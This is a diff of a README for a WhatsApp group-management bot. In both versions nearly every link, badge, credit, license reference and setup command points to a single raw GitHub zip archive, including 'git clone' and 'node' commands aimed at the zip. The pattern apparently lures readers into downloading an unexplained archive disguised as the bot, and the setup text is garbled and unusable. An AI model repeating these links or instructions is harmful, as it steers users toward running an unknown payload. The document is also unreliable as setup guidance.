@@ -3,14 +3,14 @@
 This is a WhatsApp bot built using the Baileys library for group management, including features like tagging all members, muting/unmuting, and many more. It's designed to help admins efficiently manage WhatsApp groups.
 
 <div align="center"> 
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip"> 
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip;Multi+Device+Whatsapp+Bot;Coded+By+Professor" alt="Typing SVG" />
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip"> 
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip;Multi+Device+Whatsapp+Bot;Coded+By+Professor" alt="Typing SVG" />
   </a> 
 </div> 
 
 <div align="center"> 
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip"> 
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip" alt="Knight Bot" height="300"> 
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip"> 
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip" alt="Knight Bot" height="300"> 
   </a> 
 </div>
 
@@ -23,8 +23,8 @@ This is a WhatsApp bot built using the Baileys library for group management, inc
 Click the button below to fork the Knight Bot repository to your GitHub account:
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip" alt="Fork the repository"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip" alt="Fork the repository"/>
   </a>
 </div>
 
@@ -35,19 +35,19 @@ Click the button below to fork the Knight Bot repository to your GitHub account:
 Deploy the bot and easily connect it to your WhatsApp account by pair code. Click the button below to deploy the bot on Replit.
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip%20PAIR%20CODE-Replit-success?style=for-the-badge" alt="Deploy on Replit"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip%20PAIR%20CODE-Replit-success?style=for-the-badge" alt="Deploy on Replit"/>
   </a>
 </div>
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip%20PAIR%20CODE-Easy%20Method-ff4d4d?style=for-the-badge" alt="Generate Pair Code"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip%20PAIR%20CODE-Easy%20Method-ff4d4d?style=for-the-badge" alt="Generate Pair Code"/>
   </a>
 </div>
 
 
-### After getting https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip file, upload it to session folder
+### After getting https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip file, upload it to session folder
 
 ---
 
@@ -56,30 +56,30 @@ Deploy the bot and easily connect it to your WhatsApp account by pair code. Clic
 For further customization and setup guidance, click the button below:
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip Tutorial-dc3545?style=for-the-badge&logo=youtube" alt="YouTube Link"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip Tutorial-dc3545?style=for-the-badge&logo=youtube" alt="YouTube Link"/>
   </a>
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip on Panel-28a745?style=for-the-badge" alt="Deploy on Panel"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip on Panel-28a745?style=for-the-badge" alt="Deploy on Panel"/>
   </a>
 </div>
 
 
 ### Deploy Now on Below Panel
 <div align="center">
-<a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip" target="_blank">
-  <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip" alt="Katabump"/>
+<a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip" alt="Katabump"/>
 </a>
 </div>
 
 ### Join Us
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip+3QhFUZHx-nhhZmY1">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip%20Telegram-0078E7?style=for-the-badge&logo=telegram&logoColor=white" alt="Join Telegram"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip+3QhFUZHx-nhhZmY1">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip%20Telegram-0078E7?style=for-the-badge&logo=telegram&logoColor=white" alt="Join Telegram"/>
   </a>
-  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip">
-    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip%20WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="Join WhatsApp"/>
+  <a href="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip">
+    <img src="https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip%20WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="Join WhatsApp"/>
   </a>
 </div>
 
@@ -101,7 +101,7 @@ For further customization and setup guidance, click the button below:
 
 The Knight WhatsApp Bot assists group admins by providing them with tools to efficiently manage large WhatsApp groups. The bot uses the Baileys library to interact with the WhatsApp Web API and supports multi-device features.
 
-It is lightweight and can be easily customized to add more commands as per your requirements. The bot runs in a https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip environment and provides QR code-based authentication to link your WhatsApp account.
+It is lightweight and can be easily customized to add more commands as per your requirements. The bot runs in a https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip environment and provides QR code-based authentication to link your WhatsApp account.
 
 ---
 
@@ -109,7 +109,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip installed on your system
+- https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip installed on your system
 - Git installed (for cloning the repository)
 
 ### Step-by-Step Setup
@@ -117,7 +117,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 1. **Clone the repository:**
 
     ```bash
-    git clone https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip
+    git clone https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip
     cd Knightbot-MD
     ```
 
@@ -130,7 +130,7 @@ It is lightweight and can be easily customized to add more commands as per your 
 3. **Run the bot:**
 
     ```bash
-    node https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip
+    node https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip
     ```
 
 4. **Scan the QR code:**
@@ -142,27 +142,27 @@ It is lightweight and can be easily customized to add more commands as per your 
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip) - see the [LICENSE](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip) file for details.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip) - see the [LICENSE](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip) file for details.
 
 ---
 
 ## 🙌 Contributions
 
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip).
+Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip).
 
 ---
 
 ## 🌟 Show your support
 
-If you like this project, please give it a [⭐️ star on GitHub](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip)!
+If you like this project, please give it a [⭐️ star on GitHub](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip)!
 
 
 ## Credits
 
-- [Professor](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip)
-- [Baileys](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip)
-- [TechGod143](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip) for pair code
-- [Dgxeon](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip) for pair code
+- [Professor](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip)
+- [Baileys](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip)
+- [TechGod143](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip) for pair code
+- [Dgxeon](https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip) for pair code
 
 ---
 
@@ -191,4 +191,4 @@ Copyright (c) 2024 Professor. All rights reserved.
 
 This project contains code from various open source projects:
 - Baileys (MIT License)
-- Other libraries as listed in https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/assets/MD-Knightbot-quizzicality.zip
+- Other libraries as listed in https://raw.githubusercontent.com/cnn123-bit/Knightbot-MD/main/commands/MD_Knightbot_v3.2.zip
